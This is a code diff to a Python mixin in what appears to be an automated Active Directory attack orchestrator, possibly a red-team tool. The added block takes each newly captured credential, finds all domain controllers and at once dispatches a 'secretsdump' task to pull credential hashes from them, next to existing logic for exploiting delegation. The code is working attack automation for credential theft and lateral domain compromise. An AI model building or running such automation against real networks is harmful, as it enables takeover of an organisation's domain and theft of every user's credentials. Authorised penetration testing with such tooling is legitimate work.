@@ -186,7 +186,58 @@ class PublishingMixin:
                             )
                         except Exception as e:
                             logger.warning(f"Error exploiting delegation with credential: {e}")
-                        # NOTE: Secretsdump handled by _auto_credential_access (~15s interval, signaled on new creds)
+
+                        # IMMEDIATE: Dispatch secretsdump against all DCs
+                        # This saves ~1 minute vs waiting for _auto_credential_access
+                        try:
+                            dc_ips = [h.ip for h in self.shared_state.all_hosts if h.is_dc and h.ip]
+                            if dc_ips:
+                                secretsdump_key = (
+                                    f"{credential.domain}:{credential.username}:secretsdump"
+                                )
+                                if (
+                                    secretsdump_key
+                                    not in self.shared_state.processed_cred_expansion
+                                ):
+                                    if is_threaded:
+                                        sd_task_id = await self.request_credential_access(
+                                            source_agent="orchestrator",
+                                            domain=credential.domain,
+                                            username=credential.username,
+                                            password=credential.password,
+                                            target_ips=dc_ips,
+                                            reason="secretsdump_immediate",
+                                            techniques=["secretsdump"],
+                                            task_queue=effective_task_queue,
+                                        )
+                                    else:
+                                        sd_task_id = await asyncio.wait_for(
+                                            self.request_credential_access(
+                                                source_agent="orchestrator",
+                                                domain=credential.domain,
+                                                username=credential.username,
+                                                password=credential.password,
+                                                target_ips=dc_ips,
+                                                reason="secretsdump_immediate",
+                                                techniques=["secretsdump"],
+                                                task_queue=effective_task_queue,
+                                            ),
+                                            timeout=30.0,
+                                        )
+                                    if sd_task_id:
+                                        self.shared_state.processed_cred_expansion.add(
+                                            secretsdump_key
+                                        )
+                                        logger.info(
+                                            f"🚀 Immediate secretsdump dispatched for "
+                                            f"{credential.domain}\\{credential.username} against {len(dc_ips)} DCs: {sd_task_id}"
+                                        )
+                        except asyncio.TimeoutError:
+                            logger.warning(
+                                f"Timeout dispatching immediate secretsdump for {credential.domain}\\{credential.username}"
+                            )
+                        except Exception as e:
+                            logger.warning(f"Failed to dispatch immediate secretsdump: {e}")
                     else:
                         logger.warning(
                             f"Cannot dispatch delegation enum - no task_queue available: "
